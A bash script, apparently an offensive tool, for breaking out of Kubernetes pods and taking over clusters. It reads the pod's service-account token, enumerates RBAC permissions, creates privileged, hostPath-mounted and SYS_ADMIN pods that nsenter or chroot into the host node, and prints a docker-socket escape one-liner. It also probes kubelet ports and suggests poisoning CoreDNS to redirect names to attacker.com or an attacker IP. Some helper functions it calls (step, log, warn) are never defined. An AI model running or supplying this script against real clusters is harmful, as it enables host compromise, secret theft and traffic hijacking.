#!/usr/bin/env bash
# ==============================================================================
# K8S ESCAPE — Kubernetes container breakout and cluster takeover
# Usage: bash k8s_escape.sh [--check] [--exploit TECHNIQUE]
# ==============================================================================
set -euo pipefail

TECHNIQUE="${1:-check}"

echo "=== Kubernetes Escape ==="
echo "Technique: $TECHNIQUE"
echo ""

# Check if in K8s pod
in_k8s() {
    [[ -f /var/run/secrets/kubernetes.io/serviceaccount/token ]]
}

# Check RBAC permissions
check_rbac() {
    step "K8s RBAC Permission Check"
    local token
    token=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
    [[ -z "$token" ]] && { echo "Not in K8s pod"; return 1; }
    
    local api="${KUBERNETES_SERVICE_HOST:-kubernetes.default.svc}"
    local port="${KUBERNETES_SERVICE_PORT:-443}"
    
    # SelfSubjectAccessReview
    echo "[*] Checking self permissions..."
    curl -s -k -H "Authorization: Bearer $token" -H "Content-Type: application/json" -X POST \
        -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectAccessReview","spec":{"resourceAttributes":{"namespace":"default","verb":"create","resource":"pods"}}}' \
        "https://$api:$port/apis/authorization.k8s.io/v1/selfsubjectaccessreviews" | jq -r '.status.allowed'
    
    # Check for privileged operations
    local verbs=("create" "get" "list" "watch" "update" "patch" "delete" "deletecollection")
    local resources=("pods" "pods/exec" "pods/log" "nodes" "namespaces" "serviceaccounts" "secrets" "configmaps" "roles" "rolebindings" "clusterroles" "clusterrolebindings")
    
    for verb in "${verbs[@]}"; do
        for res in "${resources[@]}"; do
            curl -s -k -H "Authorization: Bearer $token" -H "Content-Type: application/json" -X POST \
                -d "{\"apiVersion\":\"authorization.k8s.io/v1\",\"kind\":\"SelfSubjectAccessReview\",\"spec\":{\"resourceAttributes\":{\"namespace\":\"default\",\"verb\":\"$verb\",\"resource\":\"$res\"}}}" \
                "https://$api:$port/apis/authorization.k8s.io/v1/selfsubjectaccessreviews" | jq -r "select(.status.allowed==true) | \"  [+] $verb $res\""
        done
    done
}

# Technique 1: Privileged Pod
exploit_privileged_pod() {
    step "Privileged Pod Escape"
    local token
    token=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
    local api="${KUBERNETES_SERVICE_HOST:-kubernetes.default.svc}"
    local port="${KUBERNETES_SERVICE_PORT:-443}"
    local ns
    ns=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
    
    cat << POD | curl -s -k -H "Authorization: Bearer $token" -H "Content-Type: application/json" -X POST -d @- "https://$api:$port/api/v1/namespaces/$ns/pods" | jq .
{
  "apiVersion": "v1",
  "kind": "Pod",
  "metadata": {"name": "escape-$(date +%s)"},
  "spec": {
    "hostPID": true,
    "hostNetwork": true,
    "hostIPC": true,
    "containers": [{
      "name": "escape",
      "image": "alpine",
      "command": ["/bin/sh", "-c", "nsenter -t 1 -m -u -n -i sh"],
      "securityContext": {"privileged": true},
      "volumeMounts": [{"name": "host", "mountPath": "/host"}]
    }],
    "volumes": [{"name": "host", "hostPath": {"path": "/"}}],
    "restartPolicy": "Never",
    "serviceAccountName": "default"
  }
}
POD
}

# Technique 2: HostPath Mount
exploit_hostpath() {
    step "HostPath Volume Mount Escape"
    local token
    token=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
    local api="${KUBERNETES_SERVICE_HOST:-kubernetes.default.svc}"
    local port="${KUBERNETES_SERVICE_PORT:-443}"
    local ns
    ns=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
    
    cat << POD | curl -s -k -H "Authorization: Bearer $token" -H "Content-Type: application/json" -X POST -d @- "https://$api:$port/api/v1/namespaces/$ns/pods" | jq .
{
  "apiVersion": "v1",
  "kind": "Pod",
  "metadata": {"name": "hostpath-$(date +%s)"},
  "spec": {
    "containers": [{
      "name": "escape",
      "image": "alpine",
      "command": ["/bin/sh", "-c", "chroot /host /bin/bash"],
      "volumeMounts": [{"name": "host", "mountPath": "/host"}]
    }],
    "volumes": [{"name": "host", "hostPath": {"path": "/"}}],
    "restartPolicy": "Never"
  }
}
POD
}

# Technique 3: Capabilities
exploit_capabilities() {
    step "Linux Capabilities Escape"
    local token
    token=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
    local api="${KUBERNETES_SERVICE_HOST:-kubernetes.default.svc}"
    local port="${KUBERNETES_SERVICE_PORT:-443}"
    local ns
    ns=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
    
    cat << POD | curl -s -k -H "Authorization: Bearer $token" -H "Content-Type: application/json" -X POST -d @- "https://$api:$port/api/v1/namespaces/$ns/pods" | jq .
{
  "apiVersion": "v1",
  "kind": "Pod",
  "metadata": {"name": "caps-$(date +%s)"},
  "spec": {
    "containers": [{
      "name": "escape",
      "image": "alpine",
      "command": ["/bin/sh", "-c", "capsh --print && mount -o bind / /mnt && chroot /mnt /bin/bash"],
      "securityContext": {
        "capabilities": {
          "add": ["SYS_ADMIN", "SYS_RESOURCE", "DAC_OVERRIDE", "SYS_MODULE", "CAP_DAC_READ_SEARCH"]
        }
      }
    }],
    "restartPolicy": "Never"
  }
}
POD
}

# Technique 4: Container Runtime Socket
exploit_cri_socket() {
    step "Container Runtime Socket (Docker/containerd/CRI-O)"
    
    local socks=("/var/run/docker.sock" "/run/containerd/containerd.sock" "/var/run/crio/crio.sock")
    
    for sock in "${socks[@]}"; do
        if [[ -S "$sock" ]]; then
            echo "[+] Found: $sock"
            echo "  Exploit: docker -H unix://$sock run --rm -it --privileged -v /:/host alpine chroot /host /bin/sh"
        fi
    done
}

# Technique 5: Kubelet API
exploit_kubelet() {
    step "Kubelet API (Port 10250/10255)"
    
    local pod_ip
    pod_ip=$(hostname -i | awk '{print $1}')
    
    echo "[*] Checking kubelet on $pod_ip:10250..."
    curl -s -k "https://$pod_ip:10250/runningPods/" 2>/dev/null | jq -r '.items[] | "\(.metadata.namespace)/\(.metadata.name)"' | head -10
    
    echo "[*] Checking read-only port 10255..."
    curl -s "http://$pod_ip:10255/pods/" 2>/dev/null | jq -r '.items[] | "\(.metadata.namespace)/\(.metadata.name)"' | head -10
}

# Technique 6: CoreDNS Poisoning
exploit_coredns() {
    step "CoreDNS ConfigMap Poisoning"
    local token
    token=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
    local api="${KUBERNETES_SERVICE_HOST:-kubernetes.default.svc}"
    local port="${KUBERNETES_SERVICE_PORT:-443}"
    
    echo "[*] Checking CoreDNS ConfigMap..."
    curl -s -k -H "Authorization: Bearer $token" \
        "https://$api:$port/api/v1/namespaces/kube-system/configmaps/coredns" | jq -r '.data.Corefile // "Not found"'
    
    echo ""
    echo "If writable, inject:"
    echo "  rewrite name regex (.*)\.internal\.corp\.com {1}.attacker.com"
    echo "  or add: forward . <attacker_ip>"
}

# Technique 7: Admission Webhook Bypass
exploit_admission() {
    step "Admission Controller Bypass"
    local token
    token=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
    local api="${KUBERNETES_SERVICE_HOST:-kubernetes.default.svc}"
    local port="${KUBERNETES_SERVICE_PORT:-443}"
    
    echo "[*] Checking ValidatingWebhookConfigurations..."
    curl -s -k -H "Authorization: Bearer $token" \
        "https://$api:$port/apis/admissionregistration.k8s.io/v1/validatingwebhookconfigurations" | jq -r '.items[] | "\(.metadata.name): \(.webhooks[].name // "none")"'
    
    echo "[*] Checking MutatingWebhookConfigurations..."
    curl -s -k -H "Authorization: Bearer $token" \
        "https://$api:$port/apis/admissionregistration.k8s.io/v1/mutatingwebhookconfigurations" | jq -r '.items[] | "\(.metadata.name): \(.webhooks[].name // "none")"'
}

# Main
case "$TECHNIQUE" in
    --check|check)
        in_k8s && log "Running inside Kubernetes pod" || warn "Not in K8s pod"
        check_rbac
        exploit_cri_socket
        exploit_kubelet
        exploit_coredns
        exploit_admission
        ;;
    --privileged)
        exploit_privileged_pod
        ;;
    --hostpath)
        exploit_hostpath
        ;;
    --capabilities)
        exploit_capabilities
        ;;
    --cri)
        exploit_cri_socket
        ;;
    --kubelet)
        exploit_kubelet
        ;;
    --coredns)
        exploit_coredns
        ;;
    --admission)
        exploit_admission
        ;;
    --all)
        exploit_privileged_pod
        exploit_hostpath
        exploit_capabilities
        exploit_cri_socket
        exploit_kubelet
        exploit_coredns
        exploit_admission
        ;;
    *)
        echo "Usage: $0 [check|--privileged|--hostpath|--capabilities|--cri|--kubelet|--coredns|--admission|--all]"
        ;;
esac
